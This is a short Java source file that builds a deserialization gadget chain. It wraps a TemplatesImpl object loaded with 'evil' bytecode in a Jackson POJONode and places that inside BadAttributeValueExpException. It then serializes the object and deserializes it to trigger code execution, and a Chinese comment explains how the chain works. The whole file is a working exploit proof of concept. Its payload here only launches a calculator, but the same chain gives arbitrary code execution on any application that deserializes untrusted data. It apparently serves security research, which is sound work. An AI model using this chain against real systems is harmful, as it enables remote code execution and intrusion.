package Seri.POJONodeGadgets;


import Seri.Utils;
import com.fasterxml.jackson.databind.node.POJONode;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import javax.management.BadAttributeValueExpException;

/**
 * POJONode 的父类 BaseJsonNode，存在 toString()
 * 当调用 POJONode.toString() ,
 * 就会遍历 POJONode 初始化时的 Object 中的所有 getter 方法
 */
public class POJONodeBasic {
    public static void main(String[] args) throws Exception {
        byte[] bytes = Utils.getEvilPayload("calc");

        TemplatesImpl templates = new TemplatesImpl();
        Utils.setValue(templates , "_bytecodes", new byte[][]{bytes});
        Utils.setValue(templates , "_name", "gadgets");
        Utils.setValue(templates , "_tfactory", new TransformerFactoryImpl());

        POJONode pojoNode = new POJONode(templates);
        BadAttributeValueExpException bad = new BadAttributeValueExpException(null);
        Utils.setValue(bad, "val", pojoNode);

        Utils.serialize(bad ,"bin/POJONode.bin");
        Utils.unserialize("bin/POJONode.bin");


    }
}
